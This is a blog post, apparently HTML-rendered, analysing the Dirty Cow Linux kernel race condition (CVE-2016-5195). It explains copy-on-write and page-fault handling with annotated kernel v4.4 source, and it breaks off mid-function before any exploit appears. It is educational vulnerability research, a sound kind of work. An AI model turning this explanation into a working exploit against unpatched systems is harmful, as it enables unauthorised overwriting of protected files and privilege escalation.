<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="arttnba3">


    <meta name="subtitle" content="arttnba3的秘密小屋">


    <meta name="description" content="あがいた夢を捨てて揺れる今日は眠って誤魔化せ">



<title>【CVE.0x00】Analysis of CVE-2016-5195 (Dirty Cow) | arttnba3&#39;s blog</title>



    <link rel="icon" href="/img/favicon.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">「arttnba3」&#39;s reservation</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" target="_blank" rel="noopener" href="https://github.com/arttnba3">Github</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">「arttnba3」&#39;s reservation</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" target="_blank" rel="noopener" href="https://github.com/arttnba3">Github</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    var tocbot_timer;
    var DEPTH_MAX = 6; // 为 6 时展开所有
    var tocbot_default_config = {
        tocSelector: '.tocbot-list',
        contentSelector: '.post-content',
        headingSelector: 'h1, h2, h3, h4, h5',
        orderedList: false,
        scrollSmooth: true,
        onClick: extend_click,
    };

    function extend_click() {
        clearTimeout(tocbot_timer);
        tocbot_timer = setTimeout(function() {
            tocbot.refresh(obj_merge(tocbot_default_config, {
                hasInnerContainers: true
            }));
        }, 420); // 这个值是由 tocbot 源码里定义的 scrollSmoothDuration 得来的
    }

    document.ready(function() {
        tocbot.init(obj_merge(tocbot_default_config, {
            collapseDepth: 1
        }));
    });

    function expand_toc() {
        var b = document.querySelector('.tocbot-toc-expand');
        var expanded = b.getAttribute('data-expanded');
        expanded ? b.removeAttribute('data-expanded') : b.setAttribute('data-expanded', true);
        tocbot.refresh(obj_merge(tocbot_default_config, {
            collapseDepth: expanded ? 1 : DEPTH_MAX
        }));
        b.innerText = expanded ? 'Expand all' : 'Collapse all';
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

    function obj_merge(target, source) {
        for (var item in source) {
            if (source.hasOwnProperty(item)) {
                target[item] = source[item];
            }
        }
        return target;
    }
</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">【CVE.0x00】Analysis of CVE-2016-5195 (Dirty Cow)</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">arttnba3</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">四月 8, 2021&nbsp;&nbsp;23:36:27</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/CVE/">CVE</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="0x00-Before-we-start"><a href="#0x00-Before-we-start" class="headerlink" title="0x00.Before we start"></a>0x00.Before we start</h1><p><strong>CVE-2016-5195</strong>, also known as the <code>dirtyCow</code>, is a famous race-condition bug in Linux Kernel. It allows hackers to make an privileged overwrite on files that can only be read by them.</p>
<p>Before we start, let’s take a look at some antecedent knowledge.</p>
<h2 id="1-Copy-on-Write"><a href="#1-Copy-on-Write" class="headerlink" title="1. Copy-on-Write"></a>1. Copy-on-Write</h2><p>Before learning about what is <code>dirtyCow</code>, we need to know “what is a <code>COW</code>“ firstly. Let’s just start from some legacy knowledge.</p>
<h3 id="basic-COW"><a href="#basic-COW" class="headerlink" title="basic COW"></a>basic COW</h3><p>COW, also the <code>Copy On Write</code> , is a mechanism to reduce the cost of system resources. A complete copy of a process’s whole content of its address space won’t be allocated to its new child process while the process trying to make a new child process by the <code>fork()</code> syscall, but a less expensive way is chosen:</p>
<ul>
<li>The parent process and the child process will <strong>share the same page frames</strong> instead of allocating new page frames to the child and make a copy.</li>
<li>The allocation will happen only when one of them is trying to write new data on it, then comes the time of copying.</li>
<li>All page frames will be <strong>read only</strong> right after the <code>fork()</code>, so the kernel can make the detection of writing by the <em>page fault</em> and start the COW.</li>
</ul>
<p><img src="https://i.loli.net/2021/04/12/5mcfXUIkLKtx3Zb.png" alt="87BE6D2465D0C5621CA7C96D4E23860A.png"></p>
<p><img src="https://i.loli.net/2021/04/12/imwksGXKjo2dlCA.png" alt="9D5CF91BA873C5AEC5A4E6CDE75FF6C5.png"></p>
<p><img src="https://i.loli.net/2021/04/12/e7Y9HCJjIm4suAk.png" alt="FD5A70A4D50C2B733ED19AB5E5B83B3B.png"></p>
<h3 id="mmap-amp-x2F-proc-x2F-self-x2F-mem-amp-COW"><a href="#mmap-amp-x2F-proc-x2F-self-x2F-mem-amp-COW" class="headerlink" title="mmap &amp; &#x2F;proc&#x2F;self&#x2F;mem &amp; COW"></a>mmap &amp; &#x2F;proc&#x2F;self&#x2F;mem &amp; COW</h3><p>Similarily, COW also happen in the process of making a write on <code>/proc/self/mem</code> which representing the whole virtual memory address space of current process in Linux. If we make a <code>mmap()</code> of a read-only file and try to overwrite it across the <code>/proc/self/mem</code>, the COW will also happen and a copy of corresponding content of the fill will be make, thus the original file <strong>will not be affected</strong>.</p>
<h2 id="2-page-fault"><a href="#2-page-fault" class="headerlink" title="2. page fault"></a>2. page fault</h2><p>The <strong>Memory Management Unit</strong> (aka MMU) is used to translate virtual address to physical address. But it’s possible that there’s no a valid PTE(page table entry) for a memory access on a specific address currently, which means that the process tried to access a page without proper preparations. So a hardware interrupt called <code>page fault</code> will be raised.</p>
<p>Though it’s name is “fault”, but it may not really mean that a trouble occurs, it just indicates that “something is wrong”.</p>
<p>Page fault may happen while:</p>
<ul>
<li>When we’re trying to access a page that’s not in the physical memory.</li>
<li>When we’re trying to access a page that we don’t have permission to do so.</li>
</ul>
<p>To subdivide, there’re three kinds of page fault:</p>
<ul>
<li><p>When we’re accessing a valid address:</p>
<ul>
<li>There’s no corresponding page frame in the memory. Then the corresponding content will be read from the disk to the memory, and the MMU will make the mapping. This is <strong>hard page fault</strong>.</li>
<li>The page is already in the memory, but the mapping hadn’t been established. Then the mapping will be made(e.g. shared memory). This is <strong>soft page fault</strong>.</li>
</ul>
</li>
<li><p>When we’re accessing an invalid address:</p>
<ul>
<li>The page is not in the process’s address space. Then the process will be killed by SIGSEGV. This is <strong>invalid page fault</strong>.</li>
</ul>
</li>
</ul>
<h3 id="Handle-the-page-fault-in-Linux-kernel"><a href="#Handle-the-page-fault-in-Linux-kernel" class="headerlink" title="Handle the page fault in Linux kernel"></a>Handle the page fault in Linux kernel</h3><p>Now we’re going to analyze the code of page fault handler in Linux kernel v4.4, which has the <code>dirtyCOW</code> in it : )</p>
<p>We mainly focus on the situation of using <code>/proc/self/mem</code> to write on the read-only file’s mapping memory, which causes the copy-on-write and the <strong>vulnerability</strong>.</p>
<blockquote>
<p>By the way, we can read the source code of Linux kernel online on <a target="_blank" rel="noopener" href="https://elixir.bootlin.com/">https://elixir.bootlin.com/</a>.</p>
</blockquote>
<p>For general page fault handling, no matter the entry is <code>__do_page_faulr()</code> or <code>faultin_page()</code>, they’ll all call the <code>handle_mm_fault()</code> and the control flow is as below:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">handle_mm_fault()	// allocate the PTE</span><br><span class="line">	__handle_mm_fault()</span><br><span class="line">		handle_pte_fault()</span><br><span class="line">			// there&#x27;re two branch we main focus</span><br><span class="line">			do_wp_fault()</span><br><span class="line">			do_fault()</span><br><span class="line">				// there&#x27;re three branches there and only one will be done</span><br><span class="line">				do_read_fault()</span><br><span class="line">				do_cow_fault()  // we mainly focus on it</span><br><span class="line">			    do_share_fault()</span><br></pre></td></tr></table></figure>

<h4 id="①-handle-pte-fault-handle-page-fault-according-to-the-PTE"><a href="#①-handle-pte-fault-handle-page-fault-according-to-the-PTE" class="headerlink" title="① handle_pte_fault(): handle page fault according to the PTE"></a>① handle_pte_fault(): handle page fault according to the PTE</h4><p>The function is defined in  <code>mm/memory.c</code> , which is used to handle the page fault according to the PTE.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * These routines also need to handle stuff like marking pages dirty</span></span><br><span class="line"><span class="comment"> * and/or accessed for architectures that don&#x27;t do it in hardware (most</span></span><br><span class="line"><span class="comment"> * RISC architectures).  The early dirtying is also good on the i386.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There is also a hook called &quot;update_mmu_cache()&quot; that architectures</span></span><br><span class="line"><span class="comment"> * with external mmu caches can use to update those (ie the Sparc or</span></span><br><span class="line"><span class="comment"> * PowerPC hashed page tables that act as extended TLBs).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span></span><br><span class="line"><span class="comment"> * but allow concurrent faults), and pte mapped but not yet locked.</span></span><br><span class="line"><span class="comment"> * We return with pte unmapped and unlocked.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * The mmap_sem may have been released depending on flags and our</span></span><br><span class="line"><span class="comment"> * return value.  See filemap_fault() and __lock_page_or_retry().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">handle_pte_fault</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm,</span></span><br><span class="line"><span class="params">		     <span class="keyword">struct</span> vm_area_struct *vma, <span class="type">unsigned</span> <span class="type">long</span> address,</span></span><br><span class="line"><span class="params">		     <span class="type">pte_t</span> *pte, <span class="type">pmd_t</span> *pmd, <span class="type">unsigned</span> <span class="type">int</span> flags)</span></span><br></pre></td></tr></table></figure>

<p>FIrstly it’ll check whether the page is present(e.g. for x86, the PTE has a <code>PTE_P</code> bit that indicates whether the page is present), if so, it means that we may need to allocate a new page frame or swap the old page back:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line">	entry = *pte;</span><br><span class="line">	barrier();</span><br><span class="line">	<span class="keyword">if</span> (!pte_present(entry)) &#123;<span class="comment">// page is not present</span></span><br><span class="line">		<span class="keyword">if</span> (pte_none(entry)) &#123;<span class="comment">// pte is NULL, this&#x27;s the first time of access</span></span><br><span class="line">			<span class="keyword">if</span> (vma_is_anonymous(vma))<span class="comment">//for anonymous vma, a zero-page will be allocated</span></span><br><span class="line">				<span class="keyword">return</span> do_anonymous_page(mm, vma, address,</span><br><span class="line">							 pte, pmd, flags);</span><br><span class="line">			<span class="keyword">else</span></span><br><span class="line">				<span class="comment">// non-anonymous vma</span></span><br><span class="line">				<span class="comment">// just allocate the page and write corresponding content later</span></span><br><span class="line">				<span class="keyword">return</span> do_fault(mm, vma, address, pte, pmd,</span><br><span class="line">						flags, entry);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="comment">// the page is swapped to external storage, just swap it back is okay</span></span><br><span class="line">		<span class="keyword">return</span> do_swap_page(mm, vma, address,</span><br><span class="line">					pte, pmd, flags, entry);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p>If the page is already in the main memory, check whether the <code>_PAGE_PROTNONE</code> is set. if so, then it comes to the <code>do_numa_page()</code> path.</p>
<p>If not, then it’ll check whether the <code>FAULT_FLAG_WRITE</code> is set. If so, it’ll check whether we have  the permission to write. If not, then it comes to the time of COW!</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//...</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (pte_protnone(entry)) <span class="comment">// the _PAGE_PROTNONE is set</span></span><br><span class="line">	<span class="keyword">return</span> do_numa_page(mm, vma, address, entry, pte, pmd);</span><br><span class="line"></span><br><span class="line">ptl = pte_lockptr(mm, pmd);</span><br><span class="line">spin_lock(ptl);</span><br><span class="line"><span class="keyword">if</span> (unlikely(!pte_same(*pte, entry)))</span><br><span class="line">	<span class="keyword">goto</span> unlock;</span><br><span class="line"><span class="keyword">if</span> (flags &amp; FAULT_FLAG_WRITE) &#123;<span class="comment">// FAULT_FLAG_WRITE means that it&#x27;s a writing access</span></span><br><span class="line">	<span class="keyword">if</span> (!pte_write(entry)) <span class="comment">// no permission to write this page frame</span></span><br><span class="line">		<span class="comment">// COW! allocate new page and write by do_fault()-&gt;do_cow_fault()</span></span><br><span class="line">		<span class="keyword">return</span> do_wp_page(mm, vma, address,</span><br><span class="line">				pte, pmd, ptl, entry);</span><br><span class="line">	entry = pte_mkdirty(entry);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ...</span></span><br></pre></td></tr></table></figure>

<h4 id="②-do-fault-call-specific-function-according-to-the-kind-of-fault"><a href="#②-do-fault-call-specific-function-according-to-the-kind-of-fault" class="headerlink" title="② do_fault(): call specific function according to the kind of fault"></a>② do_fault(): call specific function according to the kind of fault</h4><p>This function is also in  <code>mm/memory.c</code> , it’ll call specific function according to the kind of fault.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span></span><br><span class="line"><span class="comment"> * but allow concurrent faults).</span></span><br><span class="line"><span class="comment"> * The mmap_sem may have been released depending on flags and our</span></span><br><span class="line"><span class="comment"> * return value.  See filemap_fault() and __lock_page_or_retry().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_fault</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">pte_t</span> *page_table, <span class="type">pmd_t</span> *pmd,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">pte_t</span> orig_pte)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">pgoff_t</span> pgoff = (((address &amp; PAGE_MASK)</span><br><span class="line">			- vma-&gt;vm_start) &gt;&gt; PAGE_SHIFT) + vma-&gt;vm_pgoff;</span><br><span class="line"></span><br><span class="line">	pte_unmap(page_table);</span><br><span class="line">	<span class="comment">/* The VMA was not fully populated on mmap() or missing VM_DONTEXPAND */</span></span><br><span class="line">	<span class="keyword">if</span> (!vma-&gt;vm_ops-&gt;fault)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_SIGBUS;</span><br><span class="line">	<span class="keyword">if</span> (!(flags &amp; FAULT_FLAG_WRITE))<span class="comment">// not a writing access(only to read)</span></span><br><span class="line">		<span class="keyword">return</span> do_read_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte);</span><br><span class="line">	<span class="keyword">if</span> (!(vma-&gt;vm_flags &amp; VM_SHARED))<span class="comment">// not accessing shared memory(private file mapping)</span></span><br><span class="line">		<span class="keyword">return</span> do_cow_fault(mm, vma, address, pmd, pgoff, flags,</span><br><span class="line">				orig_pte); <span class="comment">// copy-on-write</span></span><br><span class="line">	<span class="comment">// fault for accessing shared memory</span></span><br><span class="line">	<span class="keyword">return</span> do_shared_fault(mm, vma, address, pmd, pgoff, flags, orig_pte);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="③-do-cow-fault-make-the-basic-paging"><a href="#③-do-cow-fault-make-the-basic-paging" class="headerlink" title="③ do_cow_fault(): make the basic paging"></a>③ do_cow_fault(): make the basic paging</h4><p>The function is also located in <code>mm/memory.c</code> . It’ll allocate the page and called the <code>__do_fault()</code> to deal with the fault, which moves corresponding data to the page. Then the PTE of the page fault address in the page table will be set to the new page.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_cow_fault</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">pmd_t</span> *pmd,</span></span><br><span class="line"><span class="params">		<span class="type">pgoff_t</span> pgoff, <span class="type">unsigned</span> <span class="type">int</span> flags, <span class="type">pte_t</span> orig_pte)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// allocate a new page for the page fault address</span></span><br><span class="line">	new_page = alloc_page_vma(GFP_HIGHUSER_MOVABLE, vma, address);</span><br><span class="line">	<span class="keyword">if</span> (!new_page)</span><br><span class="line">		<span class="keyword">return</span> VM_FAULT_OOM;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// the vma-&gt;vm_ops.fault() will be called</span></span><br><span class="line">	<span class="comment">// for file-related operation(e.g. writing to a mapping page of a file),</span></span><br><span class="line">	<span class="comment">// it&#x27;ll copy the data of the file to the page</span></span><br><span class="line">	<span class="comment">// (e.g. for ext4, ext4_file_fault() will be called to do it)</span></span><br><span class="line">	ret = __do_fault(vma, address, pgoff, flags, new_page, &amp;fault_page);</span><br><span class="line">	<span class="keyword">if</span> (unlikely(ret &amp; (VM_FAULT_ERROR | VM_FAULT_NOPAGE | VM_FAULT_RETRY)))</span><br><span class="line">		<span class="keyword">goto</span> uncharge_out;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// some checks...</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">// mapping the new page to the page fault address</span></span><br><span class="line">	do_set_pte(vma, address, new_page, pte, <span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p>The core of <code>__do_fault()</code> is just to call the specific function of a vm_area’s operation table.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * The mmap_sem must have been held on entry, and may have been</span></span><br><span class="line"><span class="comment"> * released depending on flags and vma-&gt;vm_ops-&gt;fault() return value.</span></span><br><span class="line"><span class="comment"> * See filemap_fault() and __lock_page_retry().</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> __do_fault(<span class="keyword">struct</span> vm_area_struct *vma, <span class="type">unsigned</span> <span class="type">long</span> address,</span><br><span class="line">			<span class="type">pgoff_t</span> pgoff, <span class="type">unsigned</span> <span class="type">int</span> flags,</span><br><span class="line">			<span class="keyword">struct</span> page *cow_page, <span class="keyword">struct</span> page **page)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">vm_fault</span> <span class="title">vmf</span>;</span></span><br><span class="line">	<span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">	ret = vma-&gt;vm_ops-&gt;fault(vma, &amp;vmf);</span><br><span class="line">	</span><br><span class="line">	<span class="comment">//...</span></span><br></pre></td></tr></table></figure>

<p>The <code>do_cow_fault()</code> does make the basic paging, but the operation of writing new data hadn’t been done yet. So let’s come to the final step now.</p>
<h4 id="④-do-wp-page-make-the-copy-on-write"><a href="#④-do-wp-page-make-the-copy-on-write" class="headerlink" title="④ do_wp_page(): make the copy-on-write"></a>④ do_wp_page(): make the copy-on-write</h4><p>When the page is in the memory but we don’t have the permission to write on it, the <code>do_wp_page()</code> will do the <strong>copy-on-write</strong> to make a copy of the original page, and out writing will only affect this individual new page frame.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This routine handles present pages, when users try to write</span></span><br><span class="line"><span class="comment"> * to a shared page. It is done by copying the page to a new address</span></span><br><span class="line"><span class="comment"> * and decrementing the shared-page counter for the old page.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Note that this routine assumes that the protection checks have been</span></span><br><span class="line"><span class="comment"> * done by the caller (the low-level page fault routine in most cases).</span></span><br><span class="line"><span class="comment"> * Thus we can safely just mark it writable once we&#x27;ve done any necessary</span></span><br><span class="line"><span class="comment"> * COW.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We also mark the page dirty at this point even though the page will</span></span><br><span class="line"><span class="comment"> * change only once the write actually happens. This avoids a few races,</span></span><br><span class="line"><span class="comment"> * and potentially makes it more efficient.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * We enter with non-exclusive mmap_sem (to exclude vma changes,</span></span><br><span class="line"><span class="comment"> * but allow concurrent faults), with pte both mapped and locked.</span></span><br><span class="line"><span class="comment"> * We return with mmap_sem still held, but pte unmapped and unlocked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> <span class="title function_">do_wp_page</span><span class="params">(<span class="keyword">struct</span> mm_struct *mm, <span class="keyword">struct</span> vm_area_struct *vma,</span></span><br><span class="line"><span class="params">		<span class="type">unsigned</span> <span class="type">long</span> address, <span class="type">pte_t</span> *page_table, <span class="type">pmd_t</span> *pmd,</span></span><br><span class="line"><span class="params">		<span class="type">spinlock_t</span> *ptl, <span class="type">pte_t</span> orig_pte)</span></span><br><span class="line">	__<span class="title function_">releases</span><span class="params">(ptl)</span></span><br><span class="line">&#123;</span><br></pre></td></tr></table></figure>

<p>Firstly it’ll check whether it’s a special mapping page. If so, it’ll check whether the vm_area has the <code>VM_WRITE|VM_SHARED</code> flags, which means that it’s a shared and writable memory region and we only need to make the page writable. If not, then the <code>wp_page_copy()</code> will be called to do the COW.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">old_page</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// get the `page` struct of the linear address that caused page fault</span></span><br><span class="line"><span class="comment">// for some special mapping, the kernel doesn&#x27;t want them to appear in mm 